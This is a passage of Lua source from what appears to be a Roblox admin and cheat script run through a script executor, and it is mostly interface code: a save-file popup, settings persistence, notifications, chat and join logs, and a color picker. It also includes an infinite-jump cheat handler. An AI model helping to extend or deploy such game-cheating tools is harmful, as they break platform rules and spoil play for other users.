				Directions.Text = "There was a problem writing a save file to your PC.\n\nPlease contact the developer/support team for your exploit and tell them writefile is not working.\n\nYour settings, keybinds, waypoints, and aliases will not save if you continue.\n\nThings to try:\n> Make sure a 'workspace' folder is located in the same folder as your exploit\n> If your exploit is inside of a zip/rar file, extract it.\n> Rejoin the game and try again or restart your PC and try again."
				Directions.TextColor3 = Color3.new(1, 1, 1)
				Directions.TextWrapped = true
				Directions.TextXAlignment = Enum.TextXAlignment.Left
				Directions.TextYAlignment = Enum.TextYAlignment.Top
				Directions.ZIndex = 10

				shadow.Name = "shadow"
				shadow.Parent = FileError
				shadow.BackgroundColor3 = Color3.fromRGB(46, 46, 47)
				shadow.BorderSizePixel = 0
				shadow.Size = UDim2.new(0, 360, 0, 20)
				shadow.ZIndex = 10

				PopupText.Name = "PopupText"
				PopupText.Parent = shadow
				PopupText.BackgroundTransparency = 1
				PopupText.Size = UDim2.new(1, 0, 0.95, 0)
				PopupText.ZIndex = 10
				PopupText.Font = Enum.Font.SourceSans
				PopupText.TextSize = 14
				PopupText.Text = "File Error"
				PopupText.TextColor3 = Color3.new(1, 1, 1)
				PopupText.TextWrapped = true

				Exit.Name = "Exit"
				Exit.Parent = shadow
				Exit.BackgroundTransparency = 1
				Exit.Position = UDim2.new(1, -20, 0, 0)
				Exit.Size = UDim2.new(0, 20, 0, 20)
				Exit.Text = ""
				Exit.ZIndex = 10

				ExitImage.Parent = Exit
				ExitImage.BackgroundColor3 = Color3.new(1, 1, 1)
				ExitImage.BackgroundTransparency = 1
				ExitImage.Position = UDim2.new(0, 5, 0, 5)
				ExitImage.Size = UDim2.new(0, 10, 0, 10)
				ExitImage.Image = "rbxassetid://5054663650"
				ExitImage.ZIndex = 10

				Exit.MouseButton1Click:Connect(function()
					FileError:Destroy()
				end)
			end
		end
	else
		prefix = ';'
		StayOpen = false
		logsEnabled = false
		jLogsEnabled = false
		aliases = {}
		binds = {}
		WayPoints = {}
		PluginsTable = {}
	end
end

saves()

function updatesaves()
	if nosaves == false and writefileExploit() then
		local update = {
			prefix = prefix;
			StayOpen = StayOpen;
			logsEnabled = logsEnabled;
			jLogsEnabled = jLogsEnabled;
			aliases = aliases;
			binds = binds;
			WayPoints = AllWaypoints;
			PluginsTable = PluginsTable;
			currentShade1 = {currentShade1.R,currentShade1.G,currentShade1.B};
			currentShade2 = {currentShade2.R,currentShade2.G,currentShade2.B};
			currentShade3 = {currentShade3.R,currentShade3.G,currentShade3.B};
			currentText1 = {currentText1.R,currentText1.G,currentText1.B};
			currentText2 = {currentText2.R,currentText2.G,currentText2.B};
			currentScroll = {currentScroll.R,currentScroll.G,currentScroll.B};
			eventBinds = eventEditor.SaveData()
		}
		writefileCooldown("IY_FE.iy", game:GetService("HttpService"):JSONEncode(update))
	end
end

eventEditor.SetOnEdited(updatesaves)

pWayPoints = {}
WayPoints = {}

if #AllWaypoints > 0 then
	for i = 1, #AllWaypoints do
		if not AllWaypoints[i].GAME or AllWaypoints[i].GAME == game.PlaceId then
			WayPoints[#WayPoints + 1] = {NAME = AllWaypoints[i].NAME, COORD = {AllWaypoints[i].COORD[1], AllWaypoints[i].COORD[2], AllWaypoints[i].COORD[3]}, GAME = AllWaypoints[i].GAME}
		end
	end
end

function Time()
	local HOUR = math.floor((tick() % 86400) / 3600)
	local MINUTE = math.floor((tick() % 3600) / 60)
	local SECOND = math.floor(tick() % 60)
	local AP = HOUR > 11 and 'PM' or 'AM'
	HOUR = (HOUR % 12 == 0 and 12 or HOUR % 12)
	HOUR = HOUR < 10 and '0' .. HOUR or HOUR
	MINUTE = MINUTE < 10 and '0' .. MINUTE or MINUTE
	SECOND = SECOND < 10 and '0' .. SECOND or SECOND
	return HOUR .. ':' .. MINUTE .. ':' .. SECOND .. ' ' .. AP
end

PrefixBox.Text = prefix
local SettingsOpen = false

if StayOpen == false then
	On.BackgroundTransparency = 1
else
	On.BackgroundTransparency = 0
end

if logsEnabled then
	Toggle.Text = 'Enabled'
else
	Toggle.Text = 'Disabled'
end

if jLogsEnabled then
	Toggle_2.Text = 'Enabled'
else
	Toggle_2.Text = 'Disabled'
end

function maximizeHolder()
	if StayOpen == false then
		Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -220), "InOut", "Quart", 0.2, true, nil)
	end
end

local minimizeNum = -20
function minimizeHolder()
	if StayOpen == false then
		Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, minimizeNum), "InOut", "Quart", 0.5, true, nil)
	end
end

function cmdbarHolder()
	if StayOpen == false then
		Holder:TweenPosition(UDim2.new(1, Holder.Position.X.Offset, 1, -45), "InOut", "Quart", 0.5, true, nil)
	end
end

pinNotification = nil
local notifyCount = 0
function notify(text,text2,length)
	spawn(function()
		local LnotifyCount = notifyCount+1
		local notificationPinned = false
		notifyCount = notifyCount+1
		if pinNotification then pinNotification:Disconnect() end
		pinNotification = Notification.MouseEnter:Connect(function()
			spawn(function()
				pinNotification:Disconnect()
				notificationPinned = true
				Title_2.BackgroundTransparency = 1
				wait(0.5)
				Title_2.BackgroundTransparency = 0
			end)
		end)
		Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
		wait(0.6)
		local closepressed = false
		if text2 then
			Title_2.Text = text
			Text_2.Text = text2
		else
			Title_2.Text = 'Notification'
			Text_2.Text = text
		end
		Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, -100), "InOut", "Quart", 0.5, true, nil)
		CloseButton.MouseButton1Click:Connect(function()
			Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
			closepressed = true
			pinNotification:Disconnect()
		end)
		if length and isNumber(length) then
			wait(length)
		else
			wait(10)
		end
		if LnotifyCount == notifyCount then
			if closepressed == false and notificationPinned == false then
				pinNotification:Disconnect()
				Notification:TweenPosition(UDim2.new(1, Notification.Position.X.Offset, 1, 0), "InOut", "Quart", 0.5, true, nil)
			end
			notifyCount = 0
		end
	end)
end

local lastMessage = nil
local lastLabel = nil
local dupeCount = 1
function CreateLabel(Name, Text)
	if lastMessage == Name..Text then
		dupeCount = dupeCount+1
		lastLabel.Text = Time()..' - ['..Name..']: '..Text..' (x'..dupeCount..')'
	else
		if dupeCount > 1 then dupeCount = 1 end
		if #scroll_2:GetChildren() >= 2546 then
			scroll_2:ClearAllChildren()
		end
		local alls = 0
		for i,v in pairs(scroll_2:GetChildren()) do
			if v then
				alls = v.Size.Y.Offset + alls
			end
			if not v then
				alls = 0
			end
		end
		local tl = Instance.new('TextLabel')
		lastMessage = Name..Text
		lastLabel = tl
		tl.Name = Name
		tl.Parent = scroll_2
		tl.ZIndex = 10
		tl.Text = Time().." - ["..Name.."]: "..Text
		tl.Size = UDim2.new(0,322,0,84)
		tl.BackgroundTransparency = 1
		tl.BorderSizePixel = 0
		tl.Font = "SourceSans"
		tl.Position = UDim2.new(-1,0,0,alls)
		tl.TextTransparency = 1
		tl.TextScaled = false
		tl.TextSize = 14
		tl.TextWrapped = true
		tl.TextXAlignment = "Left"
		tl.TextYAlignment = "Top"
		tl.TextColor3 = currentText1
		tl.Size = UDim2.new(0,322,0,tl.TextBounds.Y)
		table.insert(text1,tl)
		scroll_2.CanvasSize = UDim2.new(0,0,0,alls+tl.TextBounds.Y)
		scroll_2.CanvasPosition = Vector2.new(0,scroll_2.CanvasPosition.Y+tl.TextBounds.Y)
		tl:TweenPosition(UDim2.new(0,3,0,alls), 'In', 'Quint', 0.5)
		for i = 0,50 do wait(0.05)
			tl.TextTransparency = tl.TextTransparency - 0.05
		end
		tl.TextTransparency = 0
	end
end

function CreateJoinLabel(plr,ID)
	if #scroll_3:GetChildren() >= 2546 then
		scroll_3:ClearAllChildren()
	end
	local infoFrame = Instance.new("Frame")
	local info1 = Instance.new("TextLabel")
	local info2 = Instance.new("TextLabel")
	local ImageLabel_3 = Instance.new("ImageLabel")
	infoFrame.Name = randomString()
	infoFrame.Parent = scroll_3
	infoFrame.BackgroundColor3 = Color3.new(1, 1, 1)
	infoFrame.BackgroundTransparency = 1
	infoFrame.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
	infoFrame.Size = UDim2.new(1, 0, 0, 50)
	info1.Name = randomString()
	info1.Parent = infoFrame
	info1.BackgroundTransparency = 1
	info1.BorderSizePixel = 0
	info1.Position = UDim2.new(0, 45, 0, 0)
	info1.Size = UDim2.new(0, 135, 1, 0)
	info1.ZIndex = 10
	info1.Font = Enum.Font.SourceSans
	info1.FontSize = Enum.FontSize.Size14
	info1.Text = "Username: "..plr.Name.."\nJoined Server: "..Time()
	info1.TextColor3 = Color3.new(1, 1, 1)
	info1.TextWrapped = true
	info1.TextXAlignment = Enum.TextXAlignment.Left
	info2.Name = randomString()
	info2.Parent = infoFrame
	info2.BackgroundTransparency = 1
	info2.BorderSizePixel = 0
	info2.Position = UDim2.new(0, 185, 0, 0)
	info2.Size = UDim2.new(0, 140, 1, -5)
	info2.ZIndex = 10
	info2.Font = Enum.Font.SourceSans
	info2.FontSize = Enum.FontSize.Size14
	info2.Text = "User ID: "..ID.."\nAccount Age: "..plr.AccountAge.."\nJoined Roblox: Loading..."
	info2.TextColor3 = Color3.new(1, 1, 1)
	info2.TextWrapped = true
	info2.TextXAlignment = Enum.TextXAlignment.Left
	info2.TextYAlignment = Enum.TextYAlignment.Center
	ImageLabel_3.Parent = infoFrame
	ImageLabel_3.BackgroundTransparency = 1
	ImageLabel_3.BorderSizePixel = 0
	ImageLabel_3.Size = UDim2.new(0, 45, 1, 0)
	ImageLabel_3.Image = game.Players:GetUserThumbnailAsync(ID, Enum.ThumbnailType.AvatarThumbnail, Enum.ThumbnailSize.Size420x420)
	scroll_3.CanvasSize = UDim2.new(0, 0, 0, listlayout.AbsoluteContentSize.Y)
	scroll_3.CanvasPosition = Vector2.new(0,scroll_2.CanvasPosition.Y+infoFrame.AbsoluteSize.Y)
	wait()
	local user = game:HttpGet("https://users.roblox.com/v1/users/"..ID)
	local json = game:GetService("HttpService"):JSONDecode(user)
	local date = json["created"]:sub(1,10)
	local splitDates = string.split(date,"-")
	info2.Text = string.gsub(info2.Text, "Loading...",splitDates[2].."/"..splitDates[3].."/"..splitDates[1])
end

IYMouse.KeyDown:Connect(function(Key)
	if (Key==prefix) then
		Cmdbar:CaptureFocus()
		spawn(function()
			repeat Cmdbar.Text = '' until Cmdbar.Text == ''
		end)
		maximizeHolder()
	elseif infJump == true and Key == " " then
		Players.LocalPlayer.Character.Humanoid:ChangeState(3)
	end
end)

local lastMinimizeReq = 0
Holder.MouseEnter:Connect(function()
	lastMinimizeReq = 0
	maximizeHolder()
end)

Holder.MouseLeave:Connect(function()
	if not Cmdbar:IsFocused() then
		local reqTime = tick()
		lastMinimizeReq = reqTime
		wait(1)
		if lastMinimizeReq ~= reqTime then return end
		if not Cmdbar:IsFocused() then
			minimizeHolder()
		end
	end
end)

function updateColors(color,ctype)
	if ctype == shade1 then
		for i,v in pairs(shade1) do
			v.BackgroundColor3 = color
		end
		currentShade1 = color
	elseif ctype == shade2 then
		for i,v in pairs(shade2) do
			v.BackgroundColor3 = color
		end
		currentShade2 = color
	elseif ctype == shade3 then
		for i,v in pairs(shade3) do
			v.BackgroundColor3 = color
		end
		currentShade3 = color
	elseif ctype == text1 then
		for i,v in pairs(text1) do
			v.TextColor3 = color
			if v:IsA("TextBox") then
				v.PlaceholderColor3 = color	
			end
		end
		currentText1 = color
	elseif ctype == text2 then
		for i,v in pairs(text2) do
			v.TextColor3 = color
		end
		currentText2 = color
	elseif ctype == scroll then
		for i,v in pairs(scroll) do
			v.ScrollBarImageColor3 = color
		end
		currentScroll = color
	end
end

local colorpickerOpen = false
ColorsButton.MouseButton1Click:Connect(function()
	cache_currentShade1 = currentShade1
	cache_currentShade2 = currentShade2
	cache_currentShade3 = currentShade3
	cache_currentText1 = currentText1
	cache_currentText2 = currentText2
	cache_currentScroll = currentScroll
	if not colorpickerOpen then
		colorpickerOpen = true
		picker = game:GetObjects("rbxassetid://4908465318")[1]
		picker.Name = randomString()
		picker.Parent = PARENT

		local ColorPicker do
			ColorPicker = {}

			ColorPicker.new = function()
				local newMt = setmetatable({},{})

				local pickerGui = picker.ColorPicker
				local pickerTopBar = pickerGui.TopBar
				local pickerExit = pickerTopBar.Exit
				local pickerFrame = pickerGui.Content
				local colorSpace = pickerFrame.ColorSpaceFrame.ColorSpace
				local colorStrip = pickerFrame.ColorStrip
				local previewFrame = pickerFrame.Preview
				local basicColorsFrame = pickerFrame.BasicColors
				local customColorsFrame = pickerFrame.CustomColors
				local defaultButton = pickerFrame.Default
				local cancelButton = pickerFrame.Cancel
				local shade1Button = pickerFrame.Shade1
				local shade2Button = pickerFrame.Shade2
				local shade3Button = pickerFrame.Shade3
				local text1Button = pickerFrame.Text1
				local text2Button = pickerFrame.Text2
				local scrollButton = pickerFrame.Scroll

				local colorScope = colorSpace.Scope
				local colorArrow = pickerFrame.ArrowFrame.Arrow

				local hueInput = pickerFrame.Hue.Input
				local satInput = pickerFrame.Sat.Input
				local valInput = pickerFrame.Val.Input

				local redInput = pickerFrame.Red.Input
				local greenInput = pickerFrame.Green.Input
				local blueInput = pickerFrame.Blue.Input

				local mouse = IYMouse

				local hue,sat,val = 0,0,1
				local red,green,blue = 1,1,1
				local chosenColor = Color3.new(0,0,0)

				local basicColors = {Color3.new(0,0,0),Color3.new(0.66666668653488,0,0),Color3.new(0,0.33333334326744,0),Color3.new(0.66666668653488,0.33333334326744,0),Color3.new(0,0.66666668653488,0),Color3.new(0.66666668653488,0.66666668653488,0),Color3.new(0,1,0),Color3.new(0.66666668653488,1,0),Color3.new(0,0,0.49803924560547),Color3.new(0.66666668653488,0,0.49803924560547),Color3.new(0,0.33333334326744,0.49803924560547),Color3.new(0.66666668653488,0.33333334326744,0.49803924560547),Color3.new(0,0.66666668653488,0.49803924560547),Color3.new(0.66666668653488,0.66666668653488,0.49803924560547),Color3.new(0,1,0.49803924560547),Color3.new(0.66666668653488,1,0.49803924560547),Color3.new(0,0,1),Color3.new(0.66666668653488,0,1),Color3.new(0,0.33333334326744,1),Color3.new(0.66666668653488,0.33333334326744,1),Color3.new(0,0.66666668653488,1),Color3.new(0.66666668653488,0.66666668653488,1),Color3.new(0,1,1),Color3.new(0.66666668653488,1,1),Color3.new(0.33333334326744,0,0),Color3.new(1,0,0),Color3.new(0.33333334326744,0.33333334326744,0),Color3.new(1,0.33333334326744,0),Color3.new(0.33333334326744,0.66666668653488,0),Color3.new(1,0.66666668653488,0),Color3.new(0.33333334326744,1,0),Color3.new(1,1,0),Color3.new(0.33333334326744,0,0.49803924560547),Color3.new(1,0,0.49803924560547),Color3.new(0.33333334326744,0.33333334326744,0.49803924560547),Color3.new(1,0.33333334326744,0.49803924560547),Color3.new(0.33333334326744,0.66666668653488,0.49803924560547),Color3.new(1,0.66666668653488,0.49803924560547),Color3.new(0.33333334326744,1,0.49803924560547),Color3.new(1,1,0.49803924560547),Color3.new(0.33333334326744,0,1),Color3.new(1,0,1),Color3.new(0.33333334326744,0.33333334326744,1),Color3.new(1,0.33333334326744,1),Color3.new(0.33333334326744,0.66666668653488,1),Color3.new(1,0.66666668653488,1),Color3.new(0.33333334326744,1,1),Color3.new(1,1,1)}
				local customColors = {}

				dragGUI(picker)

				local function updateColor(noupdate)
					local relativeX,relativeY,relativeStripY = 219 - hue*219, 199 - sat*199, 199 - val*199
					local hsvColor = Color3.fromHSV(hue,sat,val)

					if noupdate == 2 or not noupdate then
						hueInput.Text = tostring(math.ceil(359*hue))
						satInput.Text = tostring(math.ceil(255*sat))
						valInput.Text = tostring(math.floor(255*val))
					end
					if noupdate == 1 or not noupdate then
						redInput.Text = tostring(math.floor(255*red))
						greenInput.Text = tostring(math.floor(255*green))
						blueInput.Text = tostring(math.floor(255*blue))
					end

					chosenColor = Color3.new(red,green,blue)

					colorScope.Position = UDim2.new(0,relativeX-9,0,relativeY-9)
					colorStrip.ImageColor3 = Color3.fromHSV(hue,sat,1)
					colorArrow.Position = UDim2.new(0,-2,0,relativeStripY-4)
					previewFrame.BackgroundColor3 = chosenColor

					newMt.Color = chosenColor
					if newMt.Changed then newMt:Changed(chosenColor) end
				end

				local function colorSpaceInput()
					local relativeX = mouse.X - colorSpace.AbsolutePosition.X
					local relativeY = mouse.Y - colorSpace.AbsolutePosition.Y

					if relativeX < 0 then relativeX = 0 elseif relativeX > 219 then relativeX = 219 end
					if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end

					hue = (219 - relativeX)/219
					sat = (199 - relativeY)/199

					local hsvColor = Color3.fromHSV(hue,sat,val)
					red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

					updateColor()
				end

				local function colorStripInput()
					local relativeY = mouse.Y - colorStrip.AbsolutePosition.Y

					if relativeY < 0 then relativeY = 0 elseif relativeY > 199 then relativeY = 199 end	

					val = (199 - relativeY)/199

					local hsvColor = Color3.fromHSV(hue,sat,val)
					red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b

					updateColor()
				end

				local function hookButtons(frame,func)
					frame.ArrowFrame.Up.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
							frame.ArrowFrame.Up.BackgroundTransparency = 0.5
						elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
							local releaseEvent,runEvent

							local startTime = tick()
							local pressing = true
							local startNum = tonumber(frame.Text)

							if not startNum then return end

							releaseEvent = UserInputService.InputEnded:Connect(function(input)
								if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
								releaseEvent:Disconnect()
								pressing = false
							end)

							startNum = startNum + 1
							func(startNum)
							while pressing do
								if tick()-startTime > 0.3 then
									startNum = startNum + 1
									func(startNum)
								end
								wait(0.1)
							end
						end
					end)

					frame.ArrowFrame.Up.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
							frame.ArrowFrame.Up.BackgroundTransparency = 1
						end
					end)

					frame.ArrowFrame.Down.InputBegan:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
							frame.ArrowFrame.Down.BackgroundTransparency = 0.5
						elseif input.UserInputType == Enum.UserInputType.MouseButton1 then
							local releaseEvent,runEvent

							local startTime = tick()
							local pressing = true
							local startNum = tonumber(frame.Text)

							if not startNum then return end

							releaseEvent = UserInputService.InputEnded:Connect(function(input)
								if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
								releaseEvent:Disconnect()
								pressing = false
							end)

							startNum = startNum - 1
							func(startNum)
							while pressing do
								if tick()-startTime > 0.3 then
									startNum = startNum - 1
									func(startNum)
								end
								wait(0.1)
							end
						end
					end)

					frame.ArrowFrame.Down.InputEnded:Connect(function(input)
						if input.UserInputType == Enum.UserInputType.MouseMovement then
							frame.ArrowFrame.Down.BackgroundTransparency = 1
						end
					end)
				end

				colorSpace.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						local releaseEvent,mouseEvent

						releaseEvent = UserInputService.InputEnded:Connect(function(input)
							if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
							releaseEvent:Disconnect()
							mouseEvent:Disconnect()
						end)

						mouseEvent = UserInputService.InputChanged:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								colorSpaceInput()
							end
						end)

						colorSpaceInput()
					end
				end)

				colorStrip.InputBegan:Connect(function(input)
					if input.UserInputType == Enum.UserInputType.MouseButton1 then
						local releaseEvent,mouseEvent

						releaseEvent = UserInputService.InputEnded:Connect(function(input)
							if input.UserInputType ~= Enum.UserInputType.MouseButton1 then return end
							releaseEvent:Disconnect()
							mouseEvent:Disconnect()
						end)

						mouseEvent = UserInputService.InputChanged:Connect(function(input)
							if input.UserInputType == Enum.UserInputType.MouseMovement then
								colorStripInput()
							end
						end)

						colorStripInput()
					end
				end)

				local function updateHue(str)
					local num = tonumber(str)
					if num then
						hue = math.clamp(math.floor(num),0,359)/359
						local hsvColor = Color3.fromHSV(hue,sat,val)
						red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
						hueInput.Text = tostring(hue*359)
						updateColor(1)
					end
				end
				hueInput.FocusLost:Connect(function() updateHue(hueInput.Text) end) hookButtons(hueInput,updateHue)

				local function updateSat(str)
					local num = tonumber(str)
					if num then
						sat = math.clamp(math.floor(num),0,255)/255
						local hsvColor = Color3.fromHSV(hue,sat,val)
						red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
						satInput.Text = tostring(sat*255)
						updateColor(1)
					end
				end
				satInput.FocusLost:Connect(function() updateSat(satInput.Text) end) hookButtons(satInput,updateSat)

				local function updateVal(str)
					local num = tonumber(str)
					if num then
						val = math.clamp(math.floor(num),0,255)/255
						local hsvColor = Color3.fromHSV(hue,sat,val)
						red,green,blue = hsvColor.r,hsvColor.g,hsvColor.b
						valInput.Text = tostring(val*255)
						updateColor(1)
					end
				end
				valInput.FocusLost:Connect(function() updateVal(valInput.Text) end) hookButtons(valInput,updateVal)

				local function updateRed(str)
					local num = tonumber(str)
					if num then
						red = math.clamp(math.floor(num),0,255)/255
						local newColor = Color3.new(red,green,blue)
						hue,sat,val = Color3.toHSV(newColor)
						redInput.Text = tostring(red*255)
						updateColor(2)
					end
				end
				redInput.FocusLost:Connect(function() updateRed(redInput.Text) end) hookButtons(redInput,updateRed)

				local function updateGreen(str)
					local num = tonumber(str)
					if num then
						green = math.clamp(math.floor(num),0,255)/255
						local newColor = Color3.new(red,green,blue)
						hue,sat,val = Color3.toHSV(newColor)
						greenInput.Text = tostring(green*255)
						updateColor(2)
					end
				end
				greenInput.FocusLost:Connect(function() updateGreen(greenInput.Text) end) hookButtons(greenInput,updateGreen)

				local function updateBlue(str)
					local num = tonumber(str)
					if num then
						blue = math.clamp(math.floor(num),0,255)/255
						local newColor = Color3.new(red,green,blue)
						hue,sat,val = Color3.toHSV(newColor)
						blueInput.Text = tostring(blue*255)
						updateColor(2)
					end
				end
				blueInput.FocusLost:Connect(function() updateBlue(blueInput.Text) end) hookButtons(blueInput,updateBlue)

				local colorChoice = Instance.new("TextButton")
				colorChoice.Name = "Choice"
				colorChoice.Size = UDim2.new(0,25,0,18)
				colorChoice.BorderColor3 = Color3.new(96/255,96/255,96/255)
				colorChoice.Text = ""
				colorChoice.AutoButtonColor = false
				colorChoice.ZIndex = 10

				local row = 0
				local column = 0
				for i,v in pairs(basicColors) do
					local newColor = colorChoice:Clone()
					newColor.BackgroundColor3 = v
					newColor.Position = UDim2.new(0,1 + 30*column,0,21 + 23*row)

					newColor.MouseButton1Click:Connect(function()
						red,green,blue = v.r,v.g,v.b
						local newColor = Color3.new(red,green,blue)
						hue,sat,val = Color3.toHSV(newColor)
						updateColor()
					end)	

					newColor.Parent = basicColorsFrame
					column = column + 1
					if column == 6 then row = row + 1 column = 0 end
				end

				row = 0
				column = 0
				for i = 1,12 do
					local color = customColors[i] or Color3.new(0,0,0)
					local newColor = colorChoice:Clone()
					newColor.BackgroundColor3 = color
					newColor.Position = UDim2.new(0,1 + 30*column,0,20 + 23*row)

					newColor.MouseButton1Click:Connect(function()
						local curColor = customColors[i] or Color3.new(0,0,0)
						red,green,blue = curColor.r,curColor.g,curColor.b
						hue,sat,val = Color3.toHSV(curColor)
						updateColor()
					end)

					newColor.MouseButton2Click:Connect(function()
						customColors[i] = chosenColor
						newColor.BackgroundColor3 = chosenColor
					end)

					newColor.Parent = customColorsFrame
					column = column + 1
					if column == 6 then row = row + 1 column = 0 end
				end

				shade1Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade1) end end)
				shade1Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade1Button.BackgroundTransparency = 0.4 end end)
				shade1Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade1Button.BackgroundTransparency = 0 end end)

				shade2Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade2) end end)
				shade2Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade2Button.BackgroundTransparency = 0.4 end end)
				shade2Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade2Button.BackgroundTransparency = 0 end end)

				shade3Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,shade3) end end)
				shade3Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade3Button.BackgroundTransparency = 0.4 end end)
				shade3Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then shade3Button.BackgroundTransparency = 0 end end)

				text1Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,text1) end end)
				text1Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text1Button.BackgroundTransparency = 0.4 end end)
				text1Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text1Button.BackgroundTransparency = 0 end end)

				text2Button.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,text2) end end)
				text2Button.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text2Button.BackgroundTransparency = 0.4 end end)
				text2Button.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then text2Button.BackgroundTransparency = 0 end end)

				scrollButton.MouseButton1Click:Connect(function() if newMt.Confirm then newMt:Confirm(chosenColor,scroll) end end)
				scrollButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then scrollButton.BackgroundTransparency = 0.4 end end)
				scrollButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then scrollButton.BackgroundTransparency = 0 end end)

				cancelButton.MouseButton1Click:Connect(function() if newMt.Cancel then newMt:Cancel() end end)
				cancelButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0.4 end end)
				cancelButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then cancelButton.BackgroundTransparency = 0 end end)

				defaultButton.MouseButton1Click:Connect(function() if newMt.Default then newMt:Default() end end)
				defaultButton.InputBegan:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0.4 end end)
				defaultButton.InputEnded:Connect(function(input) if input.UserInputType == Enum.UserInputType.MouseMovement then defaultButton.BackgroundTransparency = 0 end end)

				pickerExit.MouseButton1Click:Connect(function()
					picker:TweenPosition(UDim2.new(0.5, -219, 0, -500), "InOut", "Quart", 0.5, true, nil)
				end)

				updateColor()

				newMt.SetColor = function(self,color)
					red,green,blue = color.r,color.g,color.b
					hue,sat,val = Color3.toHSV(color)
					updateColor()
				end

				return newMt
			end
		end

		picker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil)

		local Npicker = ColorPicker.new()
		Npicker.Confirm = function(self,color,ctype) updateColors(color,ctype) wait() updatesaves() end
		Npicker.Cancel = function(self)
			updateColors(cache_currentShade1,shade1)
			updateColors(cache_currentShade2,shade2)
			updateColors(cache_currentShade3,shade3)
			updateColors(cache_currentText1,text1)
			updateColors(cache_currentText2,text2)
			updateColors(cache_currentScroll,scroll)
			wait()
			updatesaves()
		end
		Npicker.Default = function(self)
			updateColors(Color3.fromRGB(36, 36, 37),shade1)
			updateColors(Color3.fromRGB(46, 46, 47),shade2)
			updateColors(Color3.fromRGB(78, 78, 79),shade3)
			updateColors(Color3.new(1, 1, 1),text1)
			updateColors(Color3.new(0, 0, 0),text2)
			updateColors(Color3.fromRGB(78,78,79),scroll)
			wait()
			updatesaves()
		end
	else
		picker:TweenPosition(UDim2.new(0.5, -219, 0, 100), "InOut", "Quart", 0.5, true, nil)
	end
end)


SettingsButton.MouseButton1Click:Connect(function()
	if SettingsOpen == false then SettingsOpen = true
		Settings:TweenPosition(UDim2.new(0, 0, 0, 45), "InOut", "Quart", 0.5, true, nil)
		CMDsF.Visible = false
	else SettingsOpen = false
		CMDsF.Visible = true
		Settings:TweenPosition(UDim2.new(0, 0, 0, 220), "InOut", "Quart", 0.5, true, nil)
	end
end)

On.MouseButton1Click:Connect(function()
	if StayOpen == false then StayOpen = true
		On.BackgroundTransparency = 0
	else StayOpen = false
		On.BackgroundTransparency = 1
	end
	updatesaves()
end)

Clear.MouseButton1Down:Connect(function()
	for _, child in pairs(scroll_2:GetChildren()) do
		child:Destroy()
	end
	scroll_2.CanvasSize = UDim2.new(0, 0, 0, 10)
end)

Toggle.MouseButton1Down:Connect(function()
	if logsEnabled then
		logsEnabled = false
		Toggle.Text = 'Disabled'
		updatesaves()
	else
		logsEnabled = true
		Toggle.Text = 'Enabled'
		updatesaves()
	end
end)

Toggle_2.MouseButton1Down:Connect(function()
	if jLogsEnabled then
		jLogsEnabled = false
		Toggle_2.Text = 'Disabled'
		updatesaves()
	else
		jLogsEnabled = true
		Toggle_2.Text = 'Enabled'
		updatesaves()
	end
end)

selectChat.MouseButton1Down:Connect(function()
	join.Visible = false
	chat.Visible = true
	table.remove(shade3,table.find(shade3,selectChat))
	table.remove(shade2,table.find(shade2,selectJoin))
	table.insert(shade2,selectChat)
	table.insert(shade3,selectJoin)
	selectJoin.BackgroundColor3 = currentShade3
	selectChat.BackgroundColor3 = currentShade2
end)

selectJoin.MouseButton1Down:Connect(function()
	chat.Visible = false
	join.Visible = true	
	table.remove(shade3,table.find(shade3,selectJoin))
	table.remove(shade2,table.find(shade2,selectChat))
	table.insert(shade2,selectJoin)
